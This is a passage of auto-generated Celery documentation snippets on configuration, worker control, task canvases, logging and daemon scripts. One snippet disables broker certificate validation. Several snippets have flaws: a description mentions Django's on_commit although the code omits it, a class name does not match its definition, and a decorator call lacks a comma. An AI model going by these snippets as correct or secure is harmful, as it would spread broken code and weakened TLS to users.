packaging tools like pip during installation to ensure necessary backports are included only when needed.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/thread.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nfutures>=3.1.1; python_version < '3.0'\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Logging in Celery using Python\nDESCRIPTION: Shows how to configure custom logging in Celery by subscribing to the setup_logging signal. Demonstrates setting up logging using a configuration file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nfrom logging.config import fileConfig\nfrom celery import signals\n\n@signals.setup_logging.connect\ndef setup_logging(**kwargs):\n    fileConfig('logging.conf')\n```\n\n----------------------------------------\n\nTITLE: Defining Dependency Requirements for Python Projects - plaintext\nDESCRIPTION: This snippet lists the required Python libraries for the project, including Django, SQLAlchemy, and Celery, with minimum version constraints. It is typically used in a requirements.txt file to automate package installation with pip. There are no special parameters, but users must ensure Python and pip are installed; the file should be placed in the project root directory and executed via 'pip install -r requirements.txt'. Outputs include the successful installation of required dependencies or errors if constraints are not met.\nSOURCE: https://github.com/celery/celery/blob/main/examples/django/requirements.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\ndjango>=2.2.1\\nsqlalchemy>=1.2.18\\ncelery>=5.0.5\n```\n\n----------------------------------------\n\nTITLE: Using celeryctl to Add and Cancel Consumers in Console\nDESCRIPTION: Example commands for using celeryctl to add a new consumer to a worker and cancel an existing consumer. This demonstrates how to use the inspect commands for queue management.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ celeryctl inspect add_consumer queue exchange direct key\n$ celeryctl inspect cancel_consumer queue\n```\n\n----------------------------------------\n\nTITLE: Enabling Event Messages in Celery Workers (console)\nDESCRIPTION: Uses the `celery control enable_events` command to instruct all workers in the cluster to start sending event messages. These messages are essential for monitoring tools like `celery events`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_17\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control enable_events\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Certificate Validation for AMQP Broker\nDESCRIPTION: Example configuration for AMQP broker SSL settings, showing how to disable certificate validation (though not recommended for security reasons).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.1.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport ssl\n\nbroker_use_ssl = {\n  'keyfile': '/var/ssl/private/worker-key.pem',\n  'certfile': '/var/ssl/amqp-server-cert.pem',\n  'ca_certs': '/var/ssl/myca.pem',\n  'cert_reqs': ssl.CERT_NONE\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Autodoc for celery.utils.timer2\nDESCRIPTION: This snippet uses Sphinx directives to configure the documentation generation for the `celery.utils.timer2` module. `.. contents:: :local:` generates a local table of contents. `.. currentmodule:: celery.utils.timer2` sets the default module for subsequent directives. `.. automodule:: celery.utils.timer2 :members: :undoc-members:` instructs Sphinx to automatically document the specified module, including all its members and even those without docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.timer2.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.timer2\n\n.. automodule:: celery.utils.timer2\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Connecting to the Remote Debugger using Telnet (Console)\nDESCRIPTION: This console command demonstrates how to connect to the waiting `rdb` session initiated by `rdb.set_trace()` in a Celery task. It uses the `telnet` utility with the host (localhost) and port (6900) provided in the worker logs. Successful connection grants access to the PDB debugging interface.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ telnet localhost 6900\nConnected to localhost.\nEscape character is '^]'.\n> /opt/devel/demoapp/tasks.py(128)add()\n-> return result\n(Pdb)\n```\n\n----------------------------------------\n\nTITLE: Changing Default Base Task Class in Celery\nDESCRIPTION: Shows how to change the default base task class for a Celery application and demonstrates the inheritance hierarchy.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_27\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import Celery, Task\n\n>>> app = Celery()\n\n>>> class MyBaseTask(Task):\n...    queue = 'hipri'\n\n>>> app.Task = MyBaseTask\n>>> app.Task\n<unbound MyBaseTask>\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add\n<@task: __main__.add>\n\n>>> add.__class__.mro()\n[<class add of <Celery __main__:0x1012b4410>>,\n <unbound MyBaseTask>,\n <unbound Task>,\n <type 'object'>]\n```\n\n----------------------------------------\n\nTITLE: Installing Celery from source\nDESCRIPTION: Step-by-step commands to download, extract, build, and install Celery from source code. This approach allows for installing a specific version from PyPI rather than using pip directly.\nSOURCE: https://github.com/celery/celery/blob/main/docs/includes/installation.txt#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ tar xvfz celery-0.0.0.tar.gz\n$ cd celery-0.0.0\n$ python setup.py build\n# python setup.py install\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Pickling Keys in a Celery App - Python\nDESCRIPTION: Illustrates how to customize object pickling for a Celery application class by defining the __reduce_keys__ method, allowing for custom attributes to be correctly preserved during serialization. Requires celery installed. The Celery subclass adds an attribute 'foo' and returns it as part of reduce keys for pickling. Inputs: kwargs for Celery; Output: pickleable Celery object with custom state.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nimport celery\n\nclass Celery(celery.Celery):\n\n    def __init__(self, *args, **kwargs):\n        super(Celery, self).__init__(*args, **kwargs)\n        self.foo = kwargs.get('foo')\n\n    def __reduce_keys__(self):\n        return super(Celery, self).__reduce_keys__().update(\n            foo=self.foo,\n        )\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Connection Timeouts\nDESCRIPTION: Setting connection timeout policies for Redis result backend\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\napp.conf.result_backend_transport_options = {\n    'retry_policy': {\n       'timeout': 5.0\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Immutable Celery Signatures for Callbacks in Python\nDESCRIPTION: Demonstrates creating an immutable signature using `signature(..., immutable=True)`. This prevents the signature's arguments from being modified, which is useful for callbacks specified via the `link` argument when the parent task's result should not be passed to the callback.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_15\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.apply_async((2, 2), link=reset_buffers.signature(immutable=True))\n```\n\n----------------------------------------\n\nTITLE: Django View with Potential Transaction Race Condition\nDESCRIPTION: This snippet shows a Django view that creates an article and launches a Celery task, but may encounter a race condition due to database transaction atomicity.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_49\n\nLANGUAGE: python\nCODE:\n```\nfrom django.db import transaction\nfrom django.http import HttpResponseRedirect\n\n@transaction.atomic\ndef create_article(request):\n    article = Article.objects.create()\n    expand_abbreviations.delay(article.pk)\n    return HttpResponseRedirect('/articles/')\n```\n\n----------------------------------------\n\nTITLE: Adding Consumer to Worker via Command Line\nDESCRIPTION: Command to add a new consumer to all workers using the celery control interface. This tells workers to start consuming from a queue named 'foo' without requiring a restart.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_23\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control add_consumer foo\n-> worker1.local: OK\n    started consuming from u'foo'\n```\n\n----------------------------------------\n\nTITLE: Creating Complex Task Chains with Chord in Celery\nDESCRIPTION: Shows how to create complex task chains using chord in Celery, combining multiple parallel tasks with a callback task and then chaining further operations.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_8\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chord\n\n>>> (chord([add.s(i, i) for i in xrange(10)], xsum.s())\n      | pow.s(2))\ntasks.xsum([tasks.add(0, 0),\n            tasks.add(1, 1),\n            tasks.add(2, 2),\n            tasks.add(3, 3),\n            tasks.add(4, 4),\n            tasks.add(5, 5),\n            tasks.add(6, 6),\n            tasks.add(7, 7),\n            tasks.add(8, 8),\n            tasks.add(9, 9)]) | tasks.pow(2)\n```\n\n----------------------------------------\n\nTITLE: Inspecting Reserved Celery Tasks\nDESCRIPTION: Lists tasks that have been prefetched by workers and are waiting to be executed (excluding scheduled ETA tasks). Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_9\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect reserved\n```\n\n----------------------------------------\n\nTITLE: Configuring Generic 'celeryd' Init Script via /etc/default/celeryd\nDESCRIPTION: Shows an example configuration file (`/etc/default/celeryd`) for the generic `celeryd` init script. It defines variables like node names (`CELERYD_NODES`), the path to the Celery binary (`CELERY_BIN`), the Celery app (`CELERY_APP`), working directory (`CELERYD_CHDIR`), worker options (`CELERYD_OPTS`), log/PID file paths (`CELERYD_LOG_FILE`, `CELERYD_PID_FILE`), user/group (`CELERYD_USER`, `CELERYD_GROUP`), and directory creation flags (`CELERY_CREATE_DIRS`). This shell script is sourced by the init script to configure the worker daemon.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n# Names of nodes to start\n#   most people will only start one node:\nCELERYD_NODES=\"worker1\"\n#   but you can also start multiple and configure settings\n#   for each in CELERYD_OPTS\n#CELERYD_NODES=\"worker1 worker2 worker3\"\n#   alternatively, you can specify the number of nodes to start:\n#CELERYD_NODES=10\n\n# Absolute or relative path to the 'celery' command:\nCELERY_BIN=\"/usr/local/bin/celery\"\n#CELERY_BIN=\"/virtualenvs/def/bin/celery\"\n\n# App instance to use\n# comment out this line if you don't use an app\nCELERY_APP=\"proj\"\n# or fully qualified:\n#CELERY_APP=\"proj.tasks:app\"\n\n# Where to chdir at start.\nCELERYD_CHDIR=\"/opt/Myproject/\"\n\n# Extra command-line arguments to the worker\nCELERYD_OPTS=\"--time-limit=300 --concurrency=8\"\n# Configure node-specific settings by appending node name to arguments:\n#CELERYD_OPTS=\"--time-limit=300 -c 8 -c:worker2 4 -c:worker3 2 -Ofair:worker1\"\n\n# Set logging level to DEBUG\n#CELERYD_LOG_LEVEL=\"DEBUG\"\n\n# %n will be replaced with the first part of the nodename.\nCELERYD_LOG_FILE=\"/var/log/celery/%n%I.log\"\nCELERYD_PID_FILE=\"/var/run/celery/%n.pid\"\n\n# Workers should run as an unprivileged user.\n#   You need to create this user manually (or you can choose\n#   a user/group combination that already exists (e.g., nobody).\nCELERYD_USER=\"celery\"\nCELERYD_GROUP=\"celery\"\n\n# If enabled pid and log directories will be created if missing,\n# and owned by the userid/group configured.\nCELERY_CREATE_DIRS=1\n```\n\n----------------------------------------\n\nTITLE: Using Complex Crontab Expressions in Python\nDESCRIPTION: Examples of using complex crontab expressions for periodic tasks in Celery. Shows how to specify minute intervals and combine multiple time constraints.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_10\n\nLANGUAGE: pycon\nCODE:\n```\n>>> crontab(minute='*/15')\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> crontab(minute='*/30', hour='8-17,1-2', day_of_week='thu-fri')\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx\nDESCRIPTION: This reStructuredText snippet uses the Sphinx `contents` directive with the `:local:` option to generate a table of contents specifically for the current section or document.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.worker.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Using Reject Semipredicate for Message Requeuing\nDESCRIPTION: Example of using the Reject exception to requeue a message if it hasn't been previously delivered. Shows how to implement conditional redelivery logic in Celery tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_35\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.exceptions import Reject\n\n@app.task(bind=True, acks_late=True)\ndef requeues(self):\n    if not self.request.delivery_info['redelivered']:\n        raise Reject('no reason', requeue=True)\n    print('received two times')\n```\n\n----------------------------------------\n\nTITLE: Using inspect to Manage Consumers in Python\nDESCRIPTION: Example of using the celery.task.control.inspect API to programmatically add and cancel consumers. Shows how to specify exchange parameters when adding a consumer.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery.task.control import inspect\n>>> inspect.add_consumer(queue='queue', exchange='exchange',\n...                      exchange_type='direct',\n...                      routing_key='key',\n...                      durable=False,\n...                      auto_delete=True)\n\n>>> inspect.cancel_consumer('queue')\n```\n\n----------------------------------------\n\nTITLE: Starting Multiple Celery Workers Using celeryd-multi\nDESCRIPTION: Demonstrates how to start multiple named Celery worker nodes using the celeryd-multi command. Shows basic start command syntax with worker names.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_11\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start jerry elaine george kramer\n```\n\n----------------------------------------\n\nTITLE: Configuring Accepted Serialization Formats in Celery - Python\nDESCRIPTION: This snippet demonstrates how to configure Celery's accepted message content types using the app.conf.accept_content setting. By default, Celery 4.0.0 accepts a broader set of formats (including potentially unsafe ones like 'pickle'), but it can be restricted for safety. This setting takes a list of allowed serialization formats, such as ['json'] or ['json', 'pickle', 'msgpack', 'yaml']. Passing only ['json'] is recommended to protect against arbitrary code execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/sec/CELERYSA-0003.txt#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\napp.conf.accept_content = ['json', 'pickle', 'msgpack', 'yaml']\n```\n\nLANGUAGE: python\nCODE:\n```\napp.conf.accept_content = ['json']\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with Optional Bundles using pip\nDESCRIPTION: This snippet demonstrates how to install Celery with optional bundles using pip. You can specify one or multiple bundles using brackets.\nSOURCE: https://github.com/celery/celery/blob/main/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ pip install \"celery[redis]\"\n\n$ pip install \"celery[redis,auth,msgpack]\"\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Database Backend\nDESCRIPTION: ReStructuredText documentation template that defines the structure for documenting the celery.backends.database module. It includes table of contents, module reference, and member documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.database.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=========================================================\n ``celery.backends.database``\n=========================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.database\n\n.. automodule:: celery.backends.database\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Using Chain as Chord Alternative with Error Callbacks in Python\nDESCRIPTION: Shows an alternative way to implement chord-like behavior using a chain, which gets upgraded to a chord internally with the same error handling behavior.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nheader = group([failingT1, failingT2])\nbody = t3\nupgraded_chord = chain(header, body)\nupgraded_chord.link_error(error_callback_sig)\n```\n\n----------------------------------------\n\nTITLE: Creating Immutable Celery Signature Explicitly in Python\nDESCRIPTION: Shows the explicit way to create an immutable Celery signature by passing `immutable=True` to the `signature()` method. This prevents arguments from being modified, useful in chains where intermediate results shouldn't be passed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_26\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.signature((2, 2), immutable=True)\n```\n\n----------------------------------------\n\nTITLE: Using Smart --app Option for Celery Worker in Console\nDESCRIPTION: Illustrates various equivalent ways to specify the Celery application instance when starting a worker using the `celery worker` command. It showcases the smart auto-detection feature of the `--app` option, which can find the app instance within a module (`proj.celery:app`), a package (`proj`), or by importing a `celery` submodule within a package (`proj.celery:`). Requires a properly structured Celery project.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_21\n\nLANGUAGE: console\nCODE:\n```\n$ celery worker --app=proj\n$ celery worker --app=proj.celery:\n$ celery worker --app=proj.celery:app\n```\n\n----------------------------------------\n\nTITLE: Generating Celery Bug Report via Command Line\nDESCRIPTION: Demonstrates how to generate a Celery bug report directly from the command line using the `celery report` command. This command collects and prints system, library versions, and configuration information helpful for reporting issues. Requires the `celery` command-line tools to be installed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_27\n\nLANGUAGE: console\nCODE:\n```\n$ celery report\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Request Handling in Celery Tasks\nDESCRIPTION: This code demonstrates how to create a custom request class that extends Celery's default Request to add custom logging for task timeouts and failures. It also shows how to create a custom Task class that uses this request handler.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_41\n\nLANGUAGE: python\nCODE:\n```\nimport logging\nfrom celery import Task\nfrom celery.worker.request import Request\n\nlogger = logging.getLogger('my.package')\n\nclass MyRequest(Request):\n    'A minimal custom request to log failures and hard time limits.'\n\n    def on_timeout(self, soft, timeout):\n        super(MyRequest, self).on_timeout(soft, timeout)\n        if not soft:\n           logger.warning(\n               'A hard timeout was enforced for task %s',\n               self.task.name\n           )\n\n    def on_failure(self, exc_info, send_failed_event=True, return_ok=False):\n        super().on_failure(\n            exc_info,\n            send_failed_event=send_failed_event,\n            return_ok=return_ok\n        )\n        logger.warning(\n            'Failure detected for task %s',\n            self.task.name\n        )\n\nclass MyTask(Task):\n    Request = MyRequest  # you can use a FQN 'my.package:MyRequest'\n\n@app.task(base=MyTask)\ndef some_longrunning_task():\n    # use your imagination\n```\n\n----------------------------------------\n\nTITLE: Managing Queue Consumers with Celery Control Command Line\nDESCRIPTION: Demonstrates how to use the celery control command line interface to add or cancel consumers for specific workers, targeting them by hostname.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_10\n\nLANGUAGE: console\nCODE:\n```\n$ celery control -d w1.example.com add_consumer queue\n$ celery control -d w1.example.com cancel_consumer queue\n```\n\n----------------------------------------\n\nTITLE: Setting Memory Limit for Celery Worker Child Processes\nDESCRIPTION: Example configuration that sets the maximum memory per child worker process to 12MB (12288 kilobytes). After exceeding this memory limit, the worker will complete its current task and then be replaced with a new worker process.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_50\n\nLANGUAGE: python\nCODE:\n```\nworker_max_memory_per_child = 12288  # 12 * 1024 = 12 MB\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Priority Steps in Celery\nDESCRIPTION: Shows how to configure priority steps for the Redis transport in Celery, allowing queues to be consumed in order of priority. The priority field ranges from 0-9, where 0 is the highest priority.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_4\n\nLANGUAGE: pycon\nCODE:\n```\n>>> BROKER_TRANSPORT_OPTIONS = {\n...     'priority_steps': [0, 2, 4, 6, 8, 9],\n... }\n```\n\n----------------------------------------\n\nTITLE: Breaking the App Chain - Good Practice Example\nDESCRIPTION: Demonstrates the recommended way of handling the Celery app in a class by passing it as an argument to the constructor.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\nclass Scheduler:\n\n    def __init__(self, app):\n        self.app = app\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Worker Control Commands in Python\nDESCRIPTION: Example of creating a custom control command with typed arguments that can be called from the command line. This demonstrates the @control_command decorator with argument specification.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.worker.control import control_command\n\n@control_command(\n    args=[('n', int)]\n    signature='[N=1]',\n)\ndef something(state, n=1, **kwargs):\n    ...\n```\n\n----------------------------------------\n\nTITLE: Configuring S3 Result Backend Settings\nDESCRIPTION: Example configuration for using Amazon S3 as a Celery result backend. Shows basic settings including access keys, bucket name, and endpoint configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_27\n\nLANGUAGE: python\nCODE:\n```\ns3_access_key_id = 's3-access-key-id'\ns3_secret_access_key = 's3-secret-access-key'\ns3_bucket = 'mybucket'\ns3_base_path = '/celery_result_backend'\ns3_endpoint_url = 'https://endpoint_url'\n```\n\n----------------------------------------\n\nTITLE: Celeryctl Migration Command Examples\nDESCRIPTION: Examples of using the celeryctl migrate command to move tasks between different message brokers, including Redis, AMQP, and Django broker configurations.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_10\n\nLANGUAGE: console\nCODE:\n```\n$ celeryctl migrate redis://localhost amqp://localhost\n$ celeryctl migrate amqp://localhost//v1 amqp://localhost//v2\n$ python manage.py celeryctl migrate django:// redis://\n```\n\n----------------------------------------\n\nTITLE: Task Processing Example\nDESCRIPTION: Example showing a task that processes file uploads with multiple steps\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef process_upload(filename, tmpfile):\n    # Increment a file count stored in a database\n    increment_file_counter()\n    add_file_metadata_to_db(filename, tmpfile)\n    copy_file_to_destination(filename, tmpfile)\n```\n\n----------------------------------------\n\nTITLE: Generating API Documentation for Celery Testing App (reStructuredText)\nDESCRIPTION: This snippet configures the documentation for the celery.contrib.testing.app module using Sphinx or reStructuredText. It includes a local table of contents, sets the documentation scope to the celery.contrib.testing.app module, and automatically documents all its members, including undocumented ones. There are no explicit function or class APIs defined directly in this snippet; it is purely for documentation structure and navigation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.testing.app.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n====================================\n ``celery.contrib.testing.app``\n====================================\n\n.. contents::\n    :local:\n\nAPI Reference\n=============\n\n.. currentmodule:: celery.contrib.testing.app\n\n.. automodule:: celery.contrib.testing.app\n    :members:\n    :undoc-members:\n\n```\n\n----------------------------------------\n\nTITLE: Using Ignore Semipredicate for Manual Result Storage\nDESCRIPTION: Shows how to use the Ignore exception to manually store task results. The task updates its state but raises Ignore to prevent the worker from recording the state automatically.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_33\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import states\nfrom celery.exceptions import Ignore\n\n@app.task(bind=True)\ndef get_tweets(self, user):\n    timeline = twitter.get_timeline(user)\n    if not self.request.called_directly:\n        self.update_state(state=states.SUCCESS, meta=timeline)\n    raise Ignore()\n```\n\n----------------------------------------\n\nTITLE: Applying starmap with a Countdown in Python Console\nDESCRIPTION: Shows how to use starmap as a signature object and apply it with a countdown of 10 seconds.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_64\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.starmap(zip(range(10), range(10))).apply_async(countdown=10)\n```\n\n----------------------------------------\n\nTITLE: Django Transaction-Aware Task Execution\nDESCRIPTION: Example showing how to properly trigger Celery tasks after database transaction completion using Django's on_commit hook.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\ndef create_user(request):\n    user = User.objects.create(username=request.POST['username'])\n    send_email.delay(user.pk)\n    return HttpResponse('User created')\n\n@shared_task\ndef send_email(user_pk):\n    user = User.objects.get(pk=user_pk)\n    # send email ...\n```\n\n----------------------------------------\n\nTITLE: Using celery_worker Fixture and Overriding Settings with Mark\nDESCRIPTION: Demonstrates a basic integration test using the `celery_worker` fixture. It calls `mytask.delay()`. It also shows how the `@pytest.mark.celery` marker can be used on a specific test (`test_other`) to override settings (like `result_backend`) defined by the global `celery_config` fixture.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\ndef test_add(celery_worker):\n    mytask.delay()\n\n\n# If you wish to override some setting in one test cases\n# only - you can use the ``celery`` mark:\n@pytest.mark.celery(result_backend='rpc')\ndef test_other(celery_worker):\n    ...\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Result Backend\nDESCRIPTION: Examples of database URI configurations for different database backends using SQLAlchemy connection strings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n# sqlite (filename)\nCELERY_RESULT_DBURI = 'sqlite:///celerydb.sqlite'\n\n# mysql\nCELERY_RESULT_DBURI = 'mysql://scott:tiger@localhost/foo'\n\n# postgresql\nCELERY_RESULT_DBURI = 'postgresql://scott:tiger@localhost/mydatabase'\n\n# oracle\nCELERY_RESULT_DBURI = 'oracle://scott:tiger@127.0.0.1:1521/sidname'\n```\n\n----------------------------------------\n\nTITLE: Sphinx Documentation Structure for Celery Backends\nDESCRIPTION: ReStructuredText markup defining the documentation structure for the celery.app.backends module. Includes a title, table of contents directive, module setting, and automodule directive for generating API documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.backends.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n===================================\n ``celery.app.backends``\n===================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.backends\n\n.. automodule:: celery.app.backends\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Customizing Task ErrorMail Handling in Celery (Python)\nDESCRIPTION: This Python code snippet demonstrates how to customize the ErrorMail handler for Celery tasks by subclassing ErrorMail and setting a custom whitelist of exceptions to trigger email notifications. It shows how to configure the app with the new ErrorMail handler by updating the CELERY_ANNOTATIONS setting. Dependencies include the celery and celery.utils.mail modules, and the snippet assumes a functioning Celery app instance. Key parameters are the exception whitelist and the should_send method, which determines when to send error emails. Inputs are exception contexts; outputs are configuration changes that enable customized error notification behavior.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\nfrom celery.utils.mail import ErrorMail\n\nclass MyErrorMail(ErrorMail):\n    whitelist = (KeyError, ImportError)\n\n    def should_send(self, context, exc):\n        return isinstance(exc, self.whitelist)\n\napp = Celery()\napp.conf.CELERY_ANNOTATIONS = {\n    '*': {\n        'ErrorMail': MyErrorMails,\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Task Time Limits\nDESCRIPTION: Examples of setting hard and soft time limits for tasks using different calling methods\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n>>> res = add.apply_async((2, 2), time_limit=10, soft_time_limit=8)\n\n>>> res = add.subtask((2, 2), time_limit=10, soft_time_limit=8).delay()\n\n>>> res = add.s(2, 2).set(time_limit=10, soft_time_limit=8).delay()\n```\n\n----------------------------------------\n\nTITLE: Generating Celery Bug Report in Python REPL\nDESCRIPTION: Shows how to programmatically generate a Celery bug report string from within a Python REPL session. This is useful for quickly getting system and configuration details for debugging. Requires the `celery` library.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_26\n\nLANGUAGE: pycon\nCODE:\n```\n>>> import celery\n>>> print(celery.bugreport())\n```\n\n----------------------------------------\n\nTITLE: Starting and Stopping RabbitMQ Server on macOS\nDESCRIPTION: Commands to start RabbitMQ server in foreground or background, and to properly stop the server using rabbitmqctl.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmq-server\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmq-server -detached\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmqctl stop\n```\n\n----------------------------------------\n\nTITLE: Enabling Propagation for Celery Loggers with Signal Handlers\nDESCRIPTION: Demonstrates how to enable logger propagation using Celery's after_setup_logger signal. This ensures logs from specific Celery loggers (like celery.app.trace) are properly emitted.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nimport celery\nimport logging\n\n@celery.signals.after_setup_logger.connect\ndef on_after_setup_logger(**kwargs):\n    logger = logging.getLogger('celery')\n    logger.propagate = True\n    logger = logging.getLogger('celery.app.trace')\n    logger.propagate = True\n```\n\n----------------------------------------\n\nTITLE: Parent-Child Task Priority Inheritance Example\nDESCRIPTION: Demonstrates how child tasks inherit priority 